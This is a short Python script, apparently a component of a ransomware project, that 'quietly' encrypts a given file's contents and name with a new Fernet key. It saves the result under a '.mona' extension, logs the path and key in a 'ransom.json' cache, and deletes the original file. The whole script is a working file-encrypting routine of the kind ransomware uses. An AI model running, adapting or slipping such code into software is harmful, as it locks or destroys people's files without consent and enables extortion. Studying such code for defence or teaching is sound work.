# quietly encrypts a file and then stores it's path and key

# black formatter gets in the way of adding to PATH
# fmt: off
from cryptography.fernet import Fernet
import sys
import os

sys.path.append(os.getcwd())
from src.utils.DirUtils import DirUtils
# fmt: on


def main():
    path = sys.argv[1]
    abs_path = os.path.abspath(path)
    du = DirUtils()
    cache_dir = du.get_cache_dir()

    # read the json
    ransom_json = du.read_json(cache_dir, 'ransom.json')

    # check that the current file hasn't been encrypted
    used_paths = ransom_json.keys()

    # if the file was already encrypted don't rencrypt it
    for used_path in used_paths:
        if abs_path == used_path:
            return -1

    file = open(path, "r+")
    data = file.read()
    file.close()

    file_name = abs_path.split('/')[-1]
    dir_path = abs_path.rsplit('/', 1)[0]
    # create encryption key
    key = Fernet.generate_key()
    fernet = Fernet(key)

    enc_file_name = (str(fernet.encrypt(file_name.encode())) +
                     '.mona').replace('/', '_')
    new_path = os.path.join(dir_path, enc_file_name)
    enc_data = str(fernet.encrypt(data.encode()))

    enc_file = open(new_path, "w")
    enc_file.write(enc_data)
    enc_file.close()

    # add decryption info to the json as a new entry
    ransom_json[abs_path] = {
        "enc_path": new_path,
        "key": str(key)
    }

    du.write_json(cache_dir, 'ransom.json', ransom_json)

    # TODO: delete original file
    os.remove(path)


main()
